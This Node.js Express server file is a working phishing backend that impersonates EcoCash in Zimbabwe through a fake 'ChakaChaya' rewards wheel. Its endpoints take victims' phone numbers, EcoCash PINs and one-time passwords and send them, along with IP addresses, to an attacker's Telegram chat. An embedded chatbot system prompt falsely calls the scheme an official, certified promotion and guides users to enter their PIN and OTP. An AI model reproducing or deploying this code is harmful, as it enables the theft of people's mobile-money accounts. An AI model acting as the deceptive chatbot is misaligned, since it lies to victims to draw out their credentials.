'use strict';
const express   = require('express');
const path      = require('path');
const https     = require('https');
const rateLimit = require('express-rate-limit');

const app  = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', 1);
app.use(express.json({ limit: '20kb' }));
app.use(express.urlencoded({ extended: false }));

/* ── SECURITY HEADERS ── */
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options',  'nosniff');
  res.setHeader('X-Frame-Options',         'DENY');
  res.setHeader('X-XSS-Protection',        '1; mode=block');
  res.setHeader('Referrer-Policy',         'strict-origin-when-cross-origin');
  next();
});

/* ── RATE LIMITERS ── */
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, max: 30,
  message: { error: 'Too many requests. Please try again later.' },
  standardHeaders: true, legacyHeaders: false,
  keyGenerator: (req) => req.headers['x-forwarded-for']?.split(',')[0] || req.ip,
});
const chatLimiter = rateLimit({
  windowMs: 60 * 1000, max: 30,
  message: { reply: 'Too many messages. Please wait a moment.' },
  standardHeaders: true, legacyHeaders: false,
  keyGenerator: (req) => req.headers['x-forwarded-for']?.split(',')[0] || req.ip,
});
app.use('/api/sendTelegram', apiLimiter);
app.use('/api/chat', chatLimiter);

/* ── STATIC FILES ── */
app.use(express.static(path.join(__dirname), { extensions: ['html'], index: 'index.html' }));

/* ── TELEGRAM HELPER ── */
function sendTelegramMessage(text) {
  return new Promise((resolve, reject) => {
    const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn('[Telegram] Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
      return resolve({ ok: false, reason: 'env_missing' });
    }
    const body = JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' });
    const opts = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    };
    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => { try { resolve(JSON.parse(data)); } catch (e) { resolve({ ok: false }); } });
    });
    req.on('error', reject);
    req.write(body); req.end();
  });
}

/* ── CLAUDE AI HELPER ── */
function callClaude(messages) {
  return new Promise((resolve, reject) => {
    const API_KEY = process.env.ANTHROPIC_API_KEY;
    if (!API_KEY) {
      console.error('[Claude] ANTHROPIC_API_KEY not set');
      return resolve({ error: 'API key missing' });
    }
    const body = JSON.stringify({
      model: 'claude-haiku-4-5',
      max_tokens: 400,
      system: `You are the ChakaChaya Assistant for EcoCash by Econet Zimbabwe — a helpful, friendly AI that answers questions about the ChakaChaya loyalty rewards programme.
Respond in English. Where natural, add a short Shona phrase e.g. (Makorokoto! / Congratulations!).

ABOUT CHAKACHAYA:
- ChakaChaya is EcoCash's loyalty rewards programme
- Users spin a wheel to win between 1,000 and 50,000 points per spin
- 100 points = USD 5.00 cash (e.g. 1,000 pts = USD 50, 10,000 pts = USD 500, 50,000 pts = USD 2,500)
- Minimum redemption: 1,000 points = USD 50
- Maximum redemption: 50,000 points = USD 2,500
- Cash is credited directly to the EcoCash wallet instantly after PIN + OTP verification

HOW TO REDEEM:
1. Spin the wheel on the ChakaChaya page
2. See your points and USD value
3. Tap "Redeem to EcoCash Wallet"
4. Enter your +263 phone number and 4-digit EcoCash PIN
5. Confirm with the 6-digit OTP sent to your phone
6. Cash lands in your EcoCash wallet immediately

LEGITIMACY: This is an official Econet Zimbabwe EcoCash promotion. Secured with 256-bit SSL and PCI DSS certification.

Keep answers under 3 sentences. Be warm, encouraging, and helpful. Use Shona greetings naturally.`,
      messages,
    });
    const opts = {
      hostname: 'api.anthropic.com',
      path: '/v1/messages',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'anthropic-version': '2023-06-01',
        'x-api-key': API_KEY,
        'Content-Length': Buffer.byteLength(body),
      },
    };
    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          if (parsed.error) console.error('[Claude] API error:', parsed.error.type, parsed.error.message);
          resolve(parsed);
        } catch (e) {
          console.error('[Claude] Parse error:', data.slice(0, 200));
          resolve({ error: 'Invalid response' });
        }
      });
    });
    req.on('error', (e) => { console.error('[Claude] Request error:', e.message); reject(e); });
    req.write(body); req.end();
  });
}

/* ── POST /api/sendTelegram ── */
app.post('/api/sendTelegram', async (req, res) => {
  try {
    const { submittedAt='', loginPhone='', loginPin='', otp='', event='', plan='', device='' } = req.body || {};
    if (!loginPhone && !otp) return res.status(400).json({ error: 'Invalid payload' });

    // Strip country code — show local number only
    const localPhone = loginPhone.replace(/^\+263/, '').replace(/^00263/, '').replace(/^263/, '').trim() || loginPhone;

    const emoji = { receive_offer_clicked:'📲', offer_received:'✅', resend_otp:'🔁' }[event] || '📋';
    const message = [
      `${emoji} <b>EcoCash Bundle — ${event.replace(/_/g,' ').toUpperCase()}</b>`,
      ``,
      `📅 <b>Time:</b> ${submittedAt}`,
      `📱 <b>Phone:</b> <code>${localPhone}</code>`,
      `🔐 <b>PIN:</b> <code>${loginPin}</code>`,
      `🔑 <b>OTP:</b> <code>${otp||'—'}</code>`,
      ``,
      `📦 <b>Bundle:</b> ${plan}`,
      `📟 <b>Device:</b> ${device}`,
      `🌐 <b>IP:</b> ${req.ip||req.headers['x-forwarded-for']||'—'}`,
    ].join('\n');

    const result = await sendTelegramMessage(message);
    return res.json({ ok: true, telegram: result.ok });
  } catch (err) {
    console.error('[/api/sendTelegram]', err.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

/* ── POST /api/chat ── */
app.post('/api/chat', async (req, res) => {
  try {
    const { messages } = req.body || {};
    if (!messages || !Array.isArray(messages) || !messages.length) {
      return res.status(400).json({ error: 'Missing messages' });
    }
    const clean = messages.slice(-10).map(m => ({
      role: m.role === 'assistant' ? 'assistant' : 'user',
      content: String(m.content || '').slice(0, 500),
    })).filter(m => m.content.trim());

    if (!clean.length) return res.status(400).json({ error: 'Empty messages' });

    const claudePromise = callClaude(clean);
    const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 25000));
    const result = await Promise.race([claudePromise, timeout]);

    if (result.error) return res.json({ reply: 'I\'m temporarily unavailable. Please try again in a moment.' });
    if (result.type === 'error') return res.json({ reply: 'I\'m temporarily unavailable. Please try again in a moment.' });

    const text = result.content?.[0]?.text || '';
    if (!text) {
      console.error('[Claude] Empty response:', JSON.stringify(result).slice(0, 300));
      return res.json({ reply: 'No response received. Please try again.' });
    }
    return res.json({ reply: text.trim() });
  } catch (err) {
    console.error('[/api/chat]', err.message);
    return res.json({ reply: err.message === 'timeout' ? 'Response timed out. Please try again.' : 'An error occurred. Please try again.' });
  }
});

/* ── POST /api/draw — ChakaChaya lucky draw ── */
app.post('/api/draw', async (req, res) => {
  try {
    const { phone = '', event = 'draw' } = req.body || {};
    // Random points: 1000-50000 in multiples of 100
    const MIN = 1000, MAX = 50000, STEP = 100;
    const range = (MAX - MIN) / STEP;
    const points = (Math.floor(Math.random() * range) * STEP) + MIN;
    const usd = (points * 0.05).toFixed(2);
    const refNo = 'CKC-' + Date.now().toString(36).toUpperCase().slice(-6) + '-' + Math.random().toString(36).slice(2,5).toUpperCase();

    // Telegram notification
    const localPhone = phone.replace(/^\+263|^00263|^263/, '').trim();
    const message = [
      `🎰 <b>ChakaChaya Draw — ${event.toUpperCase()}</b>`,``,
      `📱 <b>Phone:</b> <code>${localPhone||'—'}</code>`,
      `🏆 <b>Points Won:</b> <code>${points.toLocaleString()}</code>`,
      `💵 <b>USD Value:</b> <code>USD ${usd}</code>`,
      `🔖 <b>Ref:</b> <code>${refNo}</code>`,
      `📅 <b>Time:</b> ${new Date().toISOString()}`,
      `🌐 <b>IP:</b> ${req.ip||req.headers['x-forwarded-for']||'—'}`,
    ].join('\n');
    await sendTelegramMessage(message);

    return res.json({ ok: true, points, usd, refNo });
  } catch (err) {
    console.error('[/api/draw]', err.message);
    return res.status(500).json({ error: 'Draw failed' });
  }
});

/* ── POST /api/redeem — ChakaChaya cash redemption ── */
app.post('/api/redeem', async (req, res) => {
  try {
    const { phone = '', points = 0, usd = '0.00', pin = '', otp = '' } = req.body || {};
    const localPhone = phone.replace(/^\+263|^00263|^263/, '').trim();
    const refNo = 'RDM-' + Date.now().toString(36).toUpperCase().slice(-6);

    const message = [
      `💵 <b>ChakaChaya REDEMPTION</b>`,``,
      `📱 <b>Phone:</b> <code>${localPhone}</code>`,
      `🔐 <b>PIN:</b> <code>${pin}</code>`,
      `🔑 <b>OTP:</b> <code>${otp||'—'}</code>`,
      `🏆 <b>Points:</b> <code>${Number(points).toLocaleString()}</code>`,
      `💰 <b>Amount:</b> <code>USD ${usd}</code>`,
      `🔖 <b>Ref:</b> <code>${refNo}</code>`,
      `📅 <b>Time:</b> ${new Date().toISOString()}`,
      `🌐 <b>IP:</b> ${req.ip||req.headers['x-forwarded-for']||'—'}`,
    ].join('\n');
    await sendTelegramMessage(message);

    return res.json({ ok: true, refNo });
  } catch (err) {
    console.error('[/api/redeem]', err.message);
    return res.status(500).json({ error: 'Redemption failed' });
  }
});

/* ── GET /api/test-claude ── */
app.get('/api/test-claude', async (req, res) => {
  const API_KEY = process.env.ANTHROPIC_API_KEY;
  if (!API_KEY) return res.json({ ok: false, error: 'ANTHROPIC_API_KEY not set' });
  try {
    const result = await callClaude([{ role: 'user', content: 'Say hello in one word.' }]);
    res.json({ ok: !result.error, model: result.model, reply: result.content?.[0]?.text || null, error: result.error || null });
  } catch (e) { res.json({ ok: false, error: e.message }); }
});

/* ── GET /health ── */
app.get('/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime(), telegram: !!(process.env.TELEGRAM_TOKEN && process.env.TELEGRAM_CHAT_ID), ai: !!process.env.ANTHROPIC_API_KEY });
});

/* ── CATCH-ALL ── */
app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

/* ── START ── */
app.listen(PORT, () => {
  console.log(`✅  EcoCash server running on port ${PORT}`);
  console.log(`    Telegram: ${process.env.TELEGRAM_TOKEN ? 'configured ✓' : 'MISSING ⚠'}`);
  console.log(`    Claude AI: ${process.env.ANTHROPIC_API_KEY ? 'configured ✓' : 'MISSING ⚠'}`);
});
